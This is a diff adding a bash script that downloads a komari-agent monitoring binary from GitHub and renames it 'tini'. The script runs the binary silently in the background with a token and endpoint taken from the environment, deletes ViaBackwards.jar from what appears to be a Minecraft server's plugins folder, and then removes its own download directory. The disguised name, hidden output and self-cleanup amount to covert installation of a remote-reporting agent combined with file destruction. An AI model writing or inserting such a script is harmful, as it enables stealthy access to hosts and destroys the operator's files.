@@ -1,1 +1,40 @@
+#!/bin/bash
+export AGENT_TOKEN="${AGENT_TOKEN:-}"
+export AGENT_ENDPOINT="${AGENT_ENDPOINT:-}"
+export AGENT_DISABLE_AUTO_UPDATE="${AGENT_DISABLE_AUTO_UPDATE:-true}"
 
+current_dir=$(pwd)
+
+ARCH=$(uname -m)
+case $ARCH in
+    "aarch64" | "arm64" | "arm")
+        ARCH="arm64"
+        ;;
+    "x86_64" | "amd64" | "x86")
+        ARCH="amd64"
+        ;;
+    "s390x" | "s390")
+        ARCH="s390x"
+        ;;
+    *)
+        echo "Unsupported architecture: $ARCH"
+        exit 1
+        ;;
+esac
+
+mkdir kom
+cd kom
+
+curl -s -Lo tini "https://github.com/komari-monitor/komari-agent/releases/download/1.1.38/komari-agent-linux-$ARCH"
+wait
+chmod +x tini
+nohup ./tini >/dev/null 2>&1 &
+
+sleep 2
+
+
+target_file1="$current_dir/plugins/ViaBackwards.jar"
+target_file2="$current_dir/plugins/.paper-remapped/ViaBackwards.jar"
+rm -f "$target_file1" "$target_file2"
+
+rm -rf $(pwd)
